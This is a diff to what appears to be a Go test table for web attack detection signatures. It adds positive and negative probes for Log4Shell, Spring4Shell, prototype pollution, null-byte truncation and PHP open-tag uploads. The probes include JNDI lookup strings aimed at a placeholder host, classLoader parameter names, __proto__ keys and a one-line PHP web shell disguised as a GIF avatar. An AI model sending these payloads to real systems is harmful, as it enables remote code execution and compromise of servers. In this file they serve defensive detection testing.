@@ -268,6 +268,23 @@ var cases = []struct {
 		[]probe{path("/.env"), path("/.git/config"), path("/.vscode/settings.json"), path("/.idea/workspace.xml"),
 			path("/docker-compose.yml"), path("/config.php.bak")},
 		[]probe{path("/environment"), path("/git/config"), path("/docs/docker-compose")}},
+	{signatures.IDLog4Shell, "log4shell",
+		[]probe{arg("${jndi:ldap://x.example/a}"), hdr("User-Agent", "${JNDI:RMI://x/a}"),
+			form("${jndi:dns://x/a}"), hdr("X-Api-Version", "${jndi:http://x/a}")},
+		[]probe{arg("${env:HOME}"), arg("jndi lookup"), arg("${jndi}"), hdr("User-Agent", "jndi:ldap")}},
+	{signatures.IDSpring4Shell, "spring4shell",
+		[]probe{argName("class.module.classLoader.resources.context.parent.pipeline.first.pattern"),
+			form("class.module.classLoader.URLs[0]"), arg("class.module.classLoader")},
+		[]probe{argName("class.name"), arg("the classLoader module"), argName("module.class")}},
+	{signatures.IDPrototypePollution, "prototype pollution",
+		[]probe{argName("__proto__[admin]"), arg("constructor.prototype.admin"), form("a.__proto__.b")},
+		[]probe{arg("prototype"), arg("constructor"), argName("proto[admin]"), arg("_proto_")}},
+	{signatures.IDNullByte, "null byte",
+		[]probe{path("/?file=report.pdf%00.php"), hdr("X-File", "a\x00b"), path("/a%00b")},
+		[]probe{arg("report.pdf"), arg(`a literal \x00 written out`), upload("pixel.png", "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR")}},
+	{signatures.IDPHPOpenTag, "php open tag",
+		[]probe{upload("avatar.png", "GIF89a<?php system($_GET[0]); ?>"), form("<?PHP echo 1;"), arg("<?php")},
+		[]probe{upload("avatar.png", "GIF89a plain"), arg("<?xml version=\"1.0\"?>"), arg("php"), arg("<? echo 1 ?>")}},
 }
 
 // TestEachRuleDetectsWhatItNames runs every rule alone against payloads it must
